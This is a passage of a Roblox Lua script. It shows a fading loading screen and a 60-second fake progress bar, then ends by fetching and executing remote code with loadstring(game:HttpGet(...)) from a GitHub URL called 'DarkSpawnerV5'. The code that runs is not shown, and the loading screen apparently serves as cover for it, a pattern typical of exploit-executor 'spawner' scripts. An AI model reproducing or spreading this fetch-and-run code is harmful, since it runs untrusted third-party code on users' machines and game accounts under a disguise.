local totalTime = 60 -- seconds
local steps = 100
local waitTime = totalTime / steps

-- Fade in
for i = 1, 20 do
    local transparency = 1 - (i * 0.05)
    background.BackgroundTransparency = transparency
    label.TextTransparency = transparency
    progressBG.BackgroundTransparency = transparency
    progressBar.BackgroundTransparency = transparency
    wait(0.05)
end

for i = 1, steps do
    progressBar.Size = UDim2.new(i / steps, 0, 1, 0)

    local msgIndex = math.floor((i / steps) * #messages)
    if msgIndex == 0 then msgIndex = 1 end
    label.Text = messages[msgIndex]

    wait(waitTime)
end

wait(1)

-- Fade out
for i = 1, 20 do
    local transparency = i * 0.05
    background.BackgroundTransparency = transparency
    label.TextTransparency = transparency
    progressBG.BackgroundTransparency = transparency
    progressBar.BackgroundTransparency = transparency
    wait(0.05)
end

screenGui:Destroy()

if isIOS then
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
end

-- Execute your spawner script here
loadstring(game:HttpGet("https://raw.githubusercontent.com/jdkduejdo/DarkV5/refs/heads/main/DarkSpawnerV5"))()
